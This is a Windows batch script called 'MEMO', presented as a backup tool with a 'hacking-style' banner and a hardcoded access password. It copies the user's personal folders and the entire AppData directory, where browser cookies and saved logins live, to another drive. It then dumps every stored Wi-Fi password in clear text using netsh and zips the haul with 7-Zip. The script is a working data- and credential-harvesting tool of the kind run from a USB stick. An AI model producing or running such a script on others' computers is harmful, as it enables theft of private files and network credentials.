@echo off
:: Enable ANSI escape codes for color
:: (This requires Windows 10 or later)
if "%OS%"=="Windows_NT" (
    reg add HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1 /f >nul
)

:: ==============================================
:: MEMO - Advanced Backup and Data Retrieval Tool
:: ==============================================
:: Author: Your Name
:: Purpose: Backup files, retrieve Wi-Fi passwords, and encrypt data
:: ==============================================

:: Variables
SET odrive=%odrive:~0,2%
SET TIMESTAMP=%DATE:/=-%_%TIME::=-%
SET TIMESTAMP=%TIMESTAMP: =%
SET backupdir=%odrive%\all\Backup_%TIMESTAMP%
SET LOGFILE=%backupdir%\backup_log.txt
SET PASSWORD_FILE=Passwords.txt
SET backupcmd=xcopy /s /c /d /e /h /i /r /y
SET ZIPPASSWORD=YourSecureBackupPassword

:: Hacking-style header
echo.
echo --------------------------------------------------------
echo -                     M E M O                          -
echo -       Advanced Backup and Data Retrieval Tool        -
echo --------------------------------------------------------
echo.

:: Password Protection
set "password=notmemo"
set /p "userInput=Enter password to proceed: "
if NOT "%userInput%"=="%password%" (
    echo.
    echo --------------------------------------------------------
    echo -           [31mIncorrect password! Access denied.[0m         -
    echo --------------------------------------------------------
    pause
    exit /b
)
echo.
echo --------------------------------------------------------
echo -           [32mPassword accepted. Proceeding...[0m            -
echo --------------------------------------------------------
echo.

:: Disk Space Check
for /f "tokens=3 delims= " %%A in ('fsutil volume diskfree %odrive%') do set freeSpace=%%A
if %freeSpace% LSS 1000000000 (
    echo.
    echo --------------------------------------------------------
    echo -     [31mNot enough free space on the destination drive![0m   -
    echo --------------------------------------------------------
    pause
    exit /b
)

:: Create Backup Directory
mkdir "%backupdir%"

:: Log File Initialization
echo Backup started at %DATE% %TIME% > "%LOGFILE%"

:: Backup Files
echo.
echo --------------------------------------------------------
echo -               [32mStarting Backup Process...[0m             -
echo --------------------------------------------------------
echo.
%backupcmd% "%USERPROFILE%\Pictures" "%backupdir%\My pics" >> "%LOGFILE%" 2>&1
%backupcmd% "%USERPROFILE%\Favorites" "%backupdir%\Favorites" >> "%LOGFILE%" 2>&1
%backupcmd% "%USERPROFILE%\Videos" "%backupdir%\Videos" >> "%LOGFILE%" 2>&1
%backupcmd% "%USERPROFILE%\Desktop" "%backupdir%\Desktop" >> "%LOGFILE%" 2>&1
%backupcmd% "%USERPROFILE%\Documents" "%backupdir%\Documents" >> "%LOGFILE%" 2>&1
%backupcmd% "%USERPROFILE%\AppData" "%backupdir%\AppData" >> "%LOGFILE%" 2>&1
echo Backup completed at %DATE% %TIME% >> "%LOGFILE%"

:: Retrieve Wi-Fi Passwords and Save to File
echo.
echo --------------------------------------------------------
echo -           [32mRetrieving Wi-Fi Passwords...[0m              -
echo --------------------------------------------------------
echo.
echo Saved Wi-Fi Passwords (%DATE% %TIME%) > "%PASSWORD_FILE%"
for /f "tokens=1,2 delims=:" %%i in ('netsh wlan show profiles ^| findstr "All User Profile"') do (
    set "wifiName=%%j"
    setlocal enabledelayedexpansion
    set "wifiName=!wifiName:~1!"
    for /f "tokens=2 delims=:" %%k in ('netsh wlan show profile name="!wifiName!" key=clear ^| findstr "Key Content"') do (
        set "wifiPassword=%%k"
        set "wifiPassword=!wifiPassword:~1!"
        echo SSID: !wifiName! - Password: !wifiPassword! >> "%PASSWORD_FILE%"
    )
    endlocal
)
echo Wi-Fi passwords saved to "%PASSWORD_FILE%".

:: Password-protect the ZIP file
echo.
echo --------------------------------------------------------
echo -           [32mEncrypting Backup with Password...[0m         -
echo --------------------------------------------------------
echo.
7z a -p%ZIPPASSWORD% -mhe "%backupdir%.zip" "%backupdir%\*"

:: Completion Message
echo.
echo --------------------------------------------------------
echo -           [32mBackup process complete![0m                   -
echo -           Encrypted backup saved as:                 -
echo -           "%backupdir%.zip"                         -
echo --------------------------------------------------------
pause